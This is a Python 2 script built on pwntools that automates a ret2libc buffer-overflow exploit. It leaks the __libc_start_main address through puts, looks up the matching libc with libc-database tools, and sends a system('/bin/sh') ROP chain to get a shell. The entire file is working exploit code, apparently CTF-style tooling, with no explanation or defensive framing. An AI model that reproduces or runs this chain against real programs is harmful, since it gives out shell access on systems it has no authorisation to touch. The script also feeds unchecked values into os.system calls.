from pwn import *
import re, os, sys, subprocess, pwnlib, binascii
global config,remlib
buffer = 1032*"A"

def init(confi):
    global config
    config=confi
    context.binary=config._elf
    #context.log_level="DEBUG"
    global rop,e
    e=config._elf
    rop=ROP(e)
    global toolpa
    toolpa = "." + config._toolpa
    toolpa = config._toolpa

def recvleak(rm):               #TODO recv\n ?
    return u(rm.recvline().strip().ljust(context.bytes,"\x00")),rm
def midroll(rm):
    return config.midroll(rm)
def postroll(rm):
    return config.postroll(rm)
def preroll(rm):
    return config.preroll(rm)
def fingad(gadlis):
    return p(rop.find_gadget(gadlis)[0])
def fplt(sym):
    return p(e.plt[sym])
def fsym(sym):
    return p(e.symbols[sym])
def fgot(sym):
    return p(e.got[sym])
def p(x):
    return pack(x)
def u(x):
    return unpack(x)
def escape_ansi(lin):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', lin)


class OffGet:
    def __init__(self,lib,libcmain):#lib is id if rem else libcobject
        if remlib:
            print hex(libcmain)
            os.system(toolpa + "libcdb/dump " + lib + " > offsets")
            os.system(toolpa + "libcdb/dump " + lib + " __libc_start_main >> offsets")
            os.system(toolpa + "libcdb/dump " + lib + " exit >> offsets")
            off = open("offsets", "r")
            offsets = off.read()
            off.close()         #TODO slicer method
            self.offset___libc_start_main_ret = int((offsets.split("\n")[0]).split(" = ")[1], 0)
            self.offset_system = int((offsets.split("\n")[1]).split(" = ")[1], 0)
            self.offset_dup2 = int((offsets.split("\n")[2]).split(" = ")[1], 0)
            self.offset_read = int((offsets.split("\n")[3]).split(" = ")[1], 0)
            self.offset_write = int((offsets.split("\n")[4]).split(" = ")[1], 0)
            self.offset_str_bin_sh = int((offsets.split("\n")[5]).split(" = ")[1], 0)
            self.offset__libc_start_main = int((offsets.split("\n")[6]).split(" = ")[1], 0)
            self.offset_exit = int((offsets.split("\n")[7]).split(" = ")[1], 0)
            self.libcbase = libcmain - self.offset__libc_start_main
            self.BINSH = self.libcbase + self.offset_str_bin_sh
            self.EXIT = self.libcbase + self.offset_exit
            self.SYSTEM = self.libcbase + self.offset_system
        else:
            self.libcbase = libcmain - lib.sym["__libc_start_main"]
            self.BINSH = next(lib.search("/bin/sh"))  # Verify with find /bin/sh
            self.SYSTEM = lib.sym["system"]
            self.EXIT = lib.sym["exit"]
    def loadBSE(self):
        return p(self.BINSH)+p(self.SYSTEM)+p(self.EXIT)
######################################################################################################################
class libMe:
    def __init__(self):
        self.symbls = map(str, e.plt)
        self.libMain()
        pass

    def libMain(self):
        global remlib,buffer
        #TODO IMPLEMENT BUFFERFINDER
        remlib=False
        if config._manuallibc:
            libELF=ELF(config._pathtolibc)


        elif config._LocalOnly:
            libELF=e.libc

        else:
            remlib=True
            liblist= self.libfinder(buffer)

        if remlib:
            for lib in liblist:
                try:
                    self.libPayloader(lib)
                except:
                    pass
        else:
            self.libPayloader(libELF)

    def leakloader(self):                    #Atomic
        getter=[['pop rdi','ret']]
        for gadsym in self.symbls:
            if "puts" == gadsym:
                puts_plt=fplt("puts")
                for gettr in getter:
                    try:
                        getwww=fingad(gettr)
                        libc_start_main=fsym("__libc_start_main")
                        return getwww + libc_start_main + puts_plt , getwww
                    except:
                        print("No "+ gettr.join(" "))
                        exit(0)
                else:
                    print"WWWWOOOPOPOSOPS"


    def libPayloader(self,lib):
        load, gettr =self.leakloader()
        payload1 = buffer + load +p(e.entry)
        rm=self.libsend(payload1)
        libcmain,rm = recvleak(rm)
        off = OffGet(lib,libcmain)
        load = off.loadBSE()
        payload2 = buffer + gettr + load
        rm=midroll(rm)
        if config._debugfinalPayloadCore:
            config.debugPayload(rm,payload2)
        else:
            config.SnC(rm,payload2)
        #logGen.success("Sending Payload! Here comes the Shell!")

    def libleaker(self,buff):
        load,dump = self.leakloader()
        payload = buff + load
        libcmain,rm=recvleak(self.libsend(payload))
        return libcmain

    def libsend(self,payload):          #Atomic
        rm = preroll(config._LocalOnly)
        rm.sendline(payload)
        rm = postroll(rm)
        return rm

    def libfinder(self,buff):
        libcmain=self.libleaker(buff)
        global toolpa
        lib = lambda x: (x.split("id ")[1]).split(")")[0]
        os.system(toolpa + "libcdb/find __libc_start_main " + hex(libcmain) + ">libcanal")
        lican = open("libcanal", "r")
        licanal = lican.read().split("\n")
        lenli=len(licanal)
        licanal=licanal[:lenli-1]
        lican.close()
        liblist=map(lib,licanal)
        return liblist
